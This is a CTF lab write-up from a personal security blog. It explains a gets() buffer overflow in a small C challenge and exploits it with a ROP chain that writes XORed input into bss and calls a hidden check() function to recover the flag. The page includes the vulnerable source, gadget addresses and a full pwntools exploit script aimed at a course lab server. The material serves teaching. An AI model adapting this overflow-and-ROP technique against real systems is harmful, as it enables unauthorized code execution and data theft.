<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN 0x33(2023 Lab - ROP_RW)
  #


  Background
  #

ROP chain

  Source code
  #

:::spoiler Source Code
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>

char flag[0x10];
long secret;
char empty_buf[0x30];

void check(char *input)
{
	char pass[0x10];
	char output[0x10];
	for (int i = 0; i < 2; ++i)
	{
		((long *)pass)[i] = ((long *)input)[i] ^ secret;
	}
	if (strcmp(pass, "kyoumokawaii") == 0)
	{
		for (int i = 0; i < 2; ++i)
			((long *)output)[i] = ((long *)flag)[i] ^ ((long *)pass)[i];
	}
	printf("flag = %s\n", output);
}

int main(void)
{
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	int fd = 0;
	char buf[0x10];
	fd = open("/home/chal/flag.txt", O_RDONLY);
	read(fd, flag, 0x10);
	close(fd);

	fd = open("/dev/urandom", O_RDONLY);
	read(fd, &amp;secret, sizeof(secret));
	for (int i = 0; i < 2; ++i)
		((long *)flag)[i] = ((long *)flag)[i] ^ secret;

	printf("secret = %lx\n", secret);
	printf("> ");
	gets(buf);

	return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x33(2023 Lab - ROP_RW)"><meta property="og:description" content='Simple PWN 0x33(2023 Lab - ROP_RW) # Background # ROP chain
Source code # :::spoiler Source Code
#include <stdio.h> #include <string.h> #include <unistd.h> #include <sys/types.h> #include <fcntl.h> char flag[0x10]; long secret; char empty_buf[0x30]; void check(char *input) { char pass[0x10]; char output[0x10]; for (int i = 0; i < 2; ++i) { ((long *)pass)[i] = ((long *)input)[i] ^ secret; } if (strcmp(pass, "kyoumokawaii") == 0) { for (int i = 0; i < 2; ++i) ((long *)output)[i] = ((long *)flag)[i] ^ ((long *)pass)[i]; } printf("flag = %s\n", output); } int main(void) { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); int fd = 0; char buf[0x10]; fd = open("/home/chal/flag.txt", O_RDONLY); read(fd, flag, 0x10); close(fd); fd = open("/dev/urandom", O_RDONLY); read(fd, &amp;secret, sizeof(secret)); for (int i = 0; i < 2; ++i) ((long *)flag)[i] = ((long *)flag)[i] ^ secret; printf("secret = %lx\n", secret); printf("> "); gets(buf); return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>Simple PWN 0x33(2023 Lab - ROP_RW) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x33(2023 Lab - ROP_RW)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---rop--bof>Exploit - ROP + BOF</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x332023-lab---rop_rw>Simple PWN 0x33(2023 Lab - ROP_RW)
<a class=anchor href=#simple-pwn-0x332023-lab---rop_rw>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>ROP chain</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> secret;
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> empty_buf[<span style=color:#ae81ff>0x30</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>check</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>input)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> pass[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> output[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>i)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)pass)[i] <span style=color:#f92672>=</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)input)[i] <span style=color:#f92672>^</span> secret;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (strcmp(pass, <span style=color:#e6db74>&#34;kyoumokawaii&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>i)
</span></span><span style=display:flex><span>			((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)output)[i] <span style=color:#f92672>=</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)flag)[i] <span style=color:#f92672>^</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)pass)[i];
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;flag = %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, output);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, _IONBF, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, _IONBF, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>	fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/home/chal/flag.txt&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>	read(fd, flag, <span style=color:#ae81ff>0x10</span>);
</span></span><span style=display:flex><span>	close(fd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/urandom&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>	read(fd, <span style=color:#f92672>&amp;</span>secret, <span style=color:#66d9ef>sizeof</span>(secret));
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>i)
</span></span><span style=display:flex><span>		((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)flag)[i] <span style=color:#f92672>=</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)flag)[i] <span style=color:#f92672>^</span> secret;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;secret = %lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, secret);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
</span></span><span style=display:flex><span>	gets(buf);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>先看這個程式的行為，在main當中，他會打開flag.txt和urandom這兩個file，然後做兩者的XOR，並且回傳urandom的內容給我們，並且有BOF的漏洞存在
:::info
flag和secret這兩個變數都是global variable
:::
而check這個function的功能是我們可以輸入一個input，他會和secret做XOR，若結果等於==kyoumokawaii==就把前面加密過的flag再跟<code>kyoumokawaii</code>做XOR並回傳給我們</p><p>思路很簡單:
雖然整隻程式都沒有呼叫到check function，但如果我們拿到secret，又可以進到check，是否可以做一些操作拿到flag
一開始一定會做的事情是把flag加密
$$
cipher= flag \oplus secret\
$$
如果可以進到check function
$$
input\leftarrow kyoumokawaii\oplus secret
$$
$$
output\leftarrow cipher\oplus kyoumokawaii=flag\oplus secret\oplus kyoumokawaii
$$
$$
flag = output\oplus secret\oplus kyoumokawaii
$$
此時<code>output</code>, <code>secret</code>都已知，我們反推出flag為何，但重點是要怎麼呼叫到check function?==ROP chain + BOF==</p><ol><li>先利用該隻binary的gadget蓋成我們需要的chain，並且隨便找一個區間是不太會寫入的bss section address<pre tabindex=0><code>check_fn_addr = 0x4017ba
bss_section = 0x4c7f00
pop_rdx_rbx_ret = 0x0000000000485e8b
mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3
pop_rdi_ret = 0x00000000004020af
...
rop_chain = flat(
pop_rdi_ret,        bss_section,
pop_rdx_rbx_ret,    input_1,        0,
mov_qword_ptr_rdi_rdx_ret,
pop_rdi_ret,        bss_section + 0x8,
pop_rdx_rbx_ret,    input_2,        0,
mov_qword_ptr_rdi_rdx_ret,
pop_rdi_ret,        bss_section,
check_fn_addr
)
</code></pre></li><li>等到跳到check function後就可以開始接return output，並按照上面的公式回推flag</li></ol><h2 id=exploit---rop--bof>Exploit - ROP + BOF
<a class=anchor href=#exploit---rop--bof>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = process(&#39;./chal&#39;)</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, <span style=color:#ae81ff>10051</span>)
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;secret = &#39;</span>)
</span></span><span style=display:flex><span>secret <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;secret = </span><span style=color:#e6db74>{</span>hex(secret)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>check_fn_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4017ba</span>
</span></span><span style=display:flex><span>bss_section <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c7f00</span>
</span></span><span style=display:flex><span>pop_rdx_rbx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000485e8b</span>
</span></span><span style=display:flex><span>mov_qword_ptr_rdi_rdx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000004337e3</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000004020af</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>input_1 <span style=color:#f92672>=</span> u64(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;kyoumoka&#39;</span>) <span style=color:#f92672>^</span> secret
</span></span><span style=display:flex><span>input_2 <span style=color:#f92672>=</span> u64(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;waii</span><span style=color:#ae81ff>\x00\x00\x00\x00</span><span style=color:#e6db74>&#39;</span>) <span style=color:#f92672>^</span> secret
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;input_1 = </span><span style=color:#e6db74>{</span>hex(input_1)<span style=color:#e6db74>}</span><span style=color:#e6db74>, input_2 = </span><span style=color:#e6db74>{</span>hex(input_2)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    pop_rdi_ret,        bss_section,
</span></span><span style=display:flex><span>    pop_rdx_rbx_ret,    input_1,        <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    mov_qword_ptr_rdi_rdx_ret,
</span></span><span style=display:flex><span>    pop_rdi_ret,        bss_section <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>,
</span></span><span style=display:flex><span>    pop_rdx_rbx_ret,    input_2,        <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    mov_qword_ptr_rdi_rdx_ret,
</span></span><span style=display:flex><span>    pop_rdi_ret,        bss_section,
</span></span><span style=display:flex><span>    check_fn_addr
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span><span style=color:#75715e># raw_input()</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>40</span> <span style=color:#f92672>+</span> rop_chain)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;flag = &#39;</span>)
</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;output = </span><span style=color:#e6db74>{</span>output<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Part 1 = </span><span style=color:#e6db74>{</span>hex(u64(output[<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>8</span>]))<span style=color:#e6db74>}</span><span style=color:#e6db74>, Part 2 = </span><span style=color:#e6db74>{</span>hex(u64(output[<span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>16</span>]))<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>flag_1 <span style=color:#f92672>=</span> p64(u64(output[<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>8</span>]) <span style=color:#f92672>^</span> input_1)
</span></span><span style=display:flex><span>flag_2 <span style=color:#f92672>=</span> p64(u64(output[<span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>16</span>]) <span style=color:#f92672>^</span> input_2)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;flag = </span><span style=color:#e6db74>{</span>(flag_1 <span style=color:#f92672>+</span> flag_2)<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---rop--bof>Exploit - ROP + BOF</a></li></ul></nav></div></aside></main></body></html>